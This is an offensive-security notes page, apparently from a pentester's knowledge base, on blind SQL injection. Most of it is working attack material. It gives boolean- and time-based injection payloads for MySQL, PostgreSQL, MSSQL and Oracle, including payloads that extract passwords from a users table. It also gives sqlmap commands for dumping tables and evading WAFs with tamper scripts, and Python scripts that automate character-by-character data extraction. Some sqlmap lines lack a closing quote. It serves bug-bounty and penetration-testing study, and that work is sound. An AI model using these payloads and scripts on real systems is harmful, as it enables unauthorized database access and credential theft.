# Blind

> tags: web, sqli, intermediate, advanced

> related: SQLi/, Attack-Surface/Web/Injection/SQLi/Error-Based, Attack-Surface/Web/Injection/SQLi/Second-Order

Blind SQL Injection
No error messages. No visible data in the response. You're working with a binary signal  -  true or false, fast or slow. Blind SQLi is tedious manually but entirely automatable. I use sqlmap for the grunt work and go manual when sqlmap fails or when I need to bypass a WAF.
Boolean-Based Blind
The response differs slightly between a true condition and a false condition. Could be different page content, different response length, different HTTP status code.
Detection
-- Inject into param and compare responses
-- TRUE condition (page looks normal)
1 AND 1=1--
1' AND '1'='1'--
 
-- FALSE condition (page changes  -  missing data, different length)
1 AND 1=2--
1' AND '1'='2'--
If the responses differ → boolean blind is confirmed.
Manual Data Extraction  -  ASCII Binary Search
-- Is the first character of the DB name greater than 'm' (ASCII 109)?
1 AND ASCII(SUBSTRING(database(),1,1))>109--
 
-- Binary search until you narrow to exact char
1 AND ASCII(SUBSTRING(database(),1,1))=109--  -- confirms 'm'
 
-- Second character
1 AND ASCII(SUBSTRING(database(),2,1))>109--
This is painful manually. But understanding it helps when sqlmap needs help.
Boolean Extraction  -  MySQL
-- Count tables
1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--
 
-- First table name, first char
1 AND ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>100--
 
-- Credentials
1 AND ASCII(SUBSTR((SELECT password FROM users LIMIT 0,1),1,1))>65--
Boolean Extraction  -  PostgreSQL
1 AND (SELECT SUBSTRING(version(),1,1))='P'--
1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')>3--
1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>65--
Time-Based Blind
No response difference at all. Only signal is response time. Inject a conditional sleep  -  if the condition is true, the response delays.
Detection
-- MySQL
1 AND SLEEP(5)--
' AND SLEEP(5)--
1; SELECT SLEEP(5)--
 
-- PostgreSQL
1 AND pg_sleep(5)--
'; SELECT pg_sleep(5)--
 
-- MSSQL
1; WAITFOR DELAY '0:0:5'--
' WAITFOR DELAY '0:0:5'--
 
-- Oracle
1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--
A 5-second delay confirms injection.
Conditional Time Extraction
-- MySQL  -  if first char of DB name is 'm', sleep 5 seconds
1 AND IF(ASCII(SUBSTR(database(),1,1))=109,SLEEP(5),0)--
 
-- PostgreSQL  -  conditional sleep
1 AND CASE WHEN (ASCII(SUBSTRING(current_database(),1,1))=112) THEN pg_sleep(5) ELSE pg_sleep(0) END--
 
-- MSSQL
1; IF (ASCII(SUBSTRING(db_name(),1,1))=109) WAITFOR DELAY '0:0:5'--
sqlmap  -  Blind Automation
# Boolean-based blind
sqlmap -u "target.com/search --technique=B --dbs --batch
 
# Time-based blind
sqlmap -u "target.com/search --technique=T --dbs --batch --time-sec=5
 
# Both techniques, full extraction
sqlmap -u "target.com/search --technique=BT --dbs --batch
sqlmap -u "target.com/search -D mydb -T users --dump --batch
 
# When sqlmap needs help  -  specify DBMS
sqlmap -u "target.com/search --dbms=mysql --technique=BT --batch
 
# WAF bypass options
sqlmap -u "target.com/search --tamper=space2comment,charencode --batch
sqlmap -u "target.com/search --tamper=between,randomcase --batch
When sqlmap Fails  -  Manual Approach
sqlmap fails when:

The injection point is in a JSON body with unusual structure
There's custom token auth sqlmap can't handle
The WAF rate-limits aggressively
The response difference is subtle (timing-based inconsistencies)

Custom Request Script (Python)
import requests
import string
 
url = "target.com/search"
cookies = {"session": "your_session_token"}
 
def query(sql_condition):
    payload = f"1 AND ({sql_condition})--"
    r = requests.get(url, params={"q": payload}, cookies=cookies)
    return len(r.text) > 5000  # True if "normal" response length
 
# Extract DB name character by character
result = ""
for i in range(1, 20):
    for char in string.printable:
        condition = f"ASCII(SUBSTR(database(),{i},1))={ord(char)}"
        if query(condition):
            result += char
            print(f"[+] DB name so far: {result}")
            break
    else:
        break
 
print(f"[+] Database: {result}")
Timing Script (Time-Based)
import requests
import time
 
url = "target.com/search"
THRESHOLD = 4  # seconds
 
def time_query(sql_condition, delay=5):
    payload = f"1 AND IF(({sql_condition}),SLEEP({delay}),0)--"
    start = time.time()
    requests.get(url, params={"q": payload}, timeout=15)
    elapsed = time.time() - start
    return elapsed >= THRESHOLD
 
# Extract first char of DB name
for char in "abcdefghijklmnopqrstuvwxyz_":
    condition = f"SUBSTR(database(),1,1)='{char}'"
    if time_query(condition):
        print(f"[+] First char: {char}")
        break
sqlmap Tamper Scripts Reference









































TamperWhat it doesspace2commentReplaces spaces with /**/charencodeURL encodes everythingrandomcaseRandomizes keyword casingbetweenReplaces > with NOT BETWEEN 0 ANDgreatestReplaces > with GREATESTifnull2ifisnullBypasses some WAF keyword checksmodsecurityversionedVersioned MySQL commentsapostrophemaskReplaces ' with UTF-8 fullwidth ｀
# Stack tampers
sqlmap -u "URL" --tamper=space2comment,randomcase,charencode --batch
Public Reports

Time-based blind SQLi in search parameter on DoD asset - HackerOne #326040
Boolean-based blind SQLi in account lookup endpoint allows full database extraction - HackerOne #1107045
Time-based SQLi via SLEEP in cookie parameter bypasses WAF via space2comment tamper - HackerOne #1109311
Blind SQLi in GraphQL variable allows database enumeration - HackerOne #1064896

Related

SQLi Overview
Error-Based
Second-Order
